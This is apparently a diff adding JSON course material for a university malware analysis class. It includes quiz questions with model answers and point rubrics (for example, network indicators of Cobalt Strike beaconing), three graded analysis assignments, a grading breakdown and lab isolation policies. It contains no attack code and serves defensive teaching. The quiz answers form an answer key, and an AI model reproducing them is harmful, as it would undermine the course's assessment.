+            "answer": "(1) JA3 fingerprint: Cobalt Strike's Java TLS client has a distinctive hash differing from standard browsers, extracted from unencrypted ClientHello. (2) Beaconing timing: regular intervals (default 60s with jitter), low standard deviation vs legitimate traffic's high variance. (3) TLS certificate: self-signed, distinctive subject/serial patterns, recently issued, not in CT logs. Even with custom certs, JA3 and timing still apply.",
+            "rubric": [
+              {
+                "key": "Three valid network metadata indicators",
+                "value": 3
+              },
+              {
+                "key": "Explains why each indicates Cobalt Strike",
+                "value": 3
+              },
+              {
+                "key": "Technical accuracy",
+                "value": 2
+              }
+            ]
+          },
+          {
+            "question": "What are the five essential sections of a professional malware analysis report? Why is the executive summary most important despite being shortest?",
+            "type": "short_answer",
+            "points": 7,
+            "answer": "(1) Executive Summary: type, severity, capabilities, actions for non-technical stakeholders. (2) Static Analysis: PE structure, imports, strings, entropy, packing. (3) Dynamic Analysis: behavioral observations with evidence. (4) IoCs: hashes, network indicators, host artifacts. (5) ATT&CK Mapping: technique IDs with evidence. The executive summary is most important because it is the only section read by every stakeholder. If it does not communicate severity and actions, the rest may never be read.",
+            "rubric": [
+              {
+                "key": "Five sections correctly named with content",
+                "value": 3
+              },
+              {
+                "key": "Content descriptions are specific",
+                "value": 2
+              },
+              {
+                "key": "Convincing explanation of summary importance",
+                "value": 2
+              }
+            ]
+          }
+        ],
+        "total_points": 23
+      }
+    ],
+    "major_assignments": [
+      {
+        "assignment": 1,
+        "title": "Comprehensive Malware Analysis Report",
+        "week_assigned": 3,
+        "week_due": 7,
+        "points": 150,
+        "description": "Perform complete analysis of an unknown malware sample using static, dynamic, and code analysis. Produce a professional report with IoCs, ATT&CK mapping, YARA rule, and network signature.",
+        "objectives": [
+          "Apply static analysis for PE structure, imports, strings, and capabilities assessment",
+          "Execute dynamic analysis capturing file, registry, process, and network activity",
+          "Reverse engineer key functions: encryption, C2 protocol, persistence mechanisms",
+          "Write tested detection signatures (YARA and Snort/Suricata)"
+        ],
+        "requirements": {},
+        "deliverables": [
+          "Complete analysis report (10-15 pages) with standard structure",
+          "IoC table formatted for machine consumption",
+          "ATT&CK mapping with technique IDs and evidence",
+          "YARA rule tested against clean corpus and malware",
+          "Network detection signature for C2 traffic"
+        ],
+        "grading_rubric": {
+          "static_analysis": {
+            "points": 30,
+            "criteria": [
+              "PE header analysis with timestamp, entry point, sections",
+              "Import analysis with capabilities assessment",
+              "Strings and entropy analysis documented",
+              "Packing identified and unpacked if applicable"
+            ]
+          },
+          "dynamic_analysis": {
+            "points": 35,
+            "criteria": [
+              "Behavioral observations with ProcMon screenshots",
+              "File, registry, process, and network activity captured",
+              "Anti-analysis techniques identified and bypassed",
+              "Network IoCs extracted from captured traffic"
+            ]
+          },
+          "code_analysis": {
+            "points": 35,
+            "criteria": [
+              "Key functions identified and renamed in Ghidra",
+              "C2 protocol documented with encryption details",
+              "Configuration extracted with all IoCs",
+              "Encryption routines explained"
+            ]
+          },
+          "detection_and_reporting": {
+            "points": 50,
+            "criteria": [
+              "YARA rule with 3+ conditions, 0 false positives on clean corpus",
+              "Network signature for C2 detection",
+              "Complete ATT&CK mapping with evidence",
+              "Professional report quality with executive summary"
+            ]
+          }
+        },
+        "rubric": [
+          {
+            "attributes": {
+              "points": 150,
+              "criteria": [
+                "Static analysis (30 pts), Dynamic analysis (35 pts), Code analysis (35 pts), Detection and reporting (50 pts)"
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "assignment": 2,
+        "title": "Fileless Attack Chain Analysis Portfolio",
+        "week_assigned": 9,
+        "week_due": 13,
+        "points": 150,
+        "description": "Analyze a multi-stage fileless attack from phishing document through persistent access. Deobfuscate VBA, PowerShell, and .NET stages. Produce detection playbook for each stage.",
+        "objectives": [
+          "Extract and deobfuscate VBA macros from malicious Office document",
+          "Deobfuscate multi-layer PowerShell to reveal download and execution logic",
+          "Decompile .NET payload analyzing credential theft and C2 capabilities",
+          "Document complete attack chain with detection opportunities at each stage"
+        ],
+        "requirements": {},
+        "deliverables": [
+          "VBA macro analysis with deobfuscated code and execution flow",
+          "PowerShell deobfuscation walkthrough showing each layer removed",
+          ".NET payload analysis with dnSpy showing functions, C2, credential theft",
+          "Attack chain timeline with ATT&CK mapping",
+          "Detection playbook: Sysmon, PowerShell, and SIEM rules per stage"
+        ],
+        "grading_rubric": {
+          "vba_analysis": {
+            "points": 30,
+            "criteria": [
+              "Macro extracted with auto-execution triggers identified",
+              "Obfuscated strings decoded to reveal functionality",
+              "Command execution chain traced to PowerShell",
+              "IoCs extracted from macro"
+            ]
+          },
+          "powershell_analysis": {
+            "points": 35,
+            "criteria": [
+              "Each obfuscation layer documented and removed",
+              "Final payload extracted with download URL and execution method",
+              "Safe deobfuscation technique used",
+              "All encoding methods identified"
+            ]
+          },
+          "dotnet_and_persistence": {
+            "points": 40,
+            "criteria": [
+              "Payload decompiled with key functions identified",
+              "Credential theft mechanism analyzed",
+              "C2 protocol documented",
+              "Persistence mechanism documented"
+            ]
+          },
+          "detection_and_timeline": {
+            "points": 45,
+            "criteria": [
+              "Detection rule for each attack stage",
+              "Sysmon and PowerShell logging configuration recommendations",
+              "Complete timeline with ATT&CK mapping",
+              "Remediation recommendations"
+            ]
+          }
+        },
+        "rubric": [
+          {
+            "attributes": {
+              "points": 150,
+              "criteria": [
+                "VBA analysis (30 pts), PowerShell deobfuscation (35 pts), .NET and persistence (40 pts), Detection and timeline (45 pts)"
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "assignment": 3,
+        "title": "Advanced Malware Independent Analysis Capstone",
+        "week_assigned": 13,
+        "week_due": 15,
+        "points": 100,
+        "description": "Independently analyze an advanced sample with anti-analysis techniques, encrypted C2, and sophisticated persistence. Tests all course skills without guided instructions.",
+        "objectives": [
+          "Independently triage, analyze, and report on unknown advanced malware",
+          "Bypass anti-analysis protections to reach core malicious functionality",
+          "Extract and decrypt C2 configuration producing actionable IoCs",
+          "Write YARA rules and present findings in professional report"
+        ],
+        "requirements": {},
+        "deliverables": [
+          "Complete analysis report (8-12 pages)",
+          "Anti-analysis bypass documentation",
+          "Decrypted C2 configuration with all IoCs",
+          "YARA rule tested against clean corpus",
+          "STIX-formatted IoC package"
+        ],
+        "grading_rubric": {
+          "anti_analysis_bypass": {
+            "points": 25,
+            "criteria": [
+              "All anti-analysis techniques identified with evidence",
+              "Each bypassed using appropriate methods",
+              "Unpacking performed if needed with validated dump",
+              "Methodology documented for reproducibility"
+            ]
+          },
+          "core_analysis": {
+            "points": 35,
+            "criteria": [
+              "Capabilities documented through all analysis types",
+              "C2 protocol reverse engineered",
+              "Persistence identified and documented",
+              "All IoCs extracted"
+            ]
+          },
+          "detection_and_sharing": {
+            "points": 25,
+            "criteria": [
+              "YARA rule detects sample and variants with 0 false positives",
+              "Network or behavioral detection signature provided",
+              "STIX-formatted IoCs correctly structured",
+              "ATT&CK mapping complete"
+            ]
+          },
+          "report_quality": {
+            "points": 15,
+            "criteria": [
+              "Executive summary communicates severity and actions",
+              "All findings supported by evidence",
+              "Professional quality suitable for sharing",
+              "Reproducible methodology"
+            ]
+          }
+        },
+        "rubric": [
+          {
+            "attributes": {
+              "points": 100,
+              "criteria": [
+                "Anti-analysis bypass (25 pts), Core analysis (35 pts), Detection and sharing (25 pts), Report quality (15 pts)"
+              ]
+            }
+          }
+        ]
+      }
+    ]
+  },
+  "grading_breakdown": {
+    "weekly_quizzes": {
+      "percentage": 20,
+      "description": "Five quizzes (weeks 3, 5, 8, 11, 14) testing malware analysis concepts, tools, and techniques"
+    },
+    "lab_assignments": {
+      "percentage": 15,
+      "description": "Weekly hands-on malware analysis labs with guided and independent samples"
+    },
+    "major_assignments": {
+      "percentage": 30,
+      "description": "Three projects: comprehensive report, fileless attack analysis, and independent advanced sample"
+    },
+    "midterm_examination": {
+      "percentage": 15,
+      "description": "Practical exam: timed analysis of a malware sample with report deliverable"
+    },
+    "final_project": {
+      "percentage": 20,
+      "description": "Independent analysis capstone of an advanced malware sample with anti-analysis techniques"
+    }
+  },
+  "course_policies": {
+    "attendance": "Attendance is mandatory for all lab sessions. More than 2 unexcused absences may result in course failure.",
+    "late_submissions": "Late assignments penalized 10% per day for up to 5 days. One 48-hour extension per student per semester.",
+    "collaboration": "All analysis must be individual work. Sharing IoCs or findings before submission is prohibited. Discussion of techniques and tools is encouraged.",
+    "academic_integrity": "Samples must only be analyzed in the isolated lab environment. Removing samples from lab or executing on non-lab systems is grounds for expulsion.",
+    "technology_requirements": "Lab computers with FlareVM, REMnux, Ghidra, x64dbg provided. Personal machines need isolated VMs with host-only networking, 16GB RAM minimum. Never connect the analysis VM to the internet."
+  }
+}
